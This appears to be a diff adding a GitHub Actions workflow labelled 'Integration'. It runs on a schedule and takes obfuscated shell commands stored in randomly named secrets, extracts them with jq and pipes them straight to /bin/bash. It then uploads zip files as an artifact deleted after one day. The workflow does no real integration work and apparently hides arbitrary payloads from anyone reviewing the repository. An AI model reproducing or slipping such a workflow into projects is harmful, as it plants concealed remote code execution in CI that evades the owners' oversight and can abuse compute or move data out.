@@ -1,0 +1,33 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '1 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          pt9593: ${{ secrets.pt9593 }}
+        run: |
+          printf '%s' "$pt9593" | jq -r .wqqck44 | /bin/bash
+          printf '%s' "$ueb29" | jq -r .ecasy16 | /bin/bash
+          printf '%s' "$ftkm58303" | jq -r .kg98963 | /bin/bash
+          printf '%s' "$czgz7539" | jq -r .c912 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: YUOFtMH8
+          path: "*.zip"
+          retention-days: 1
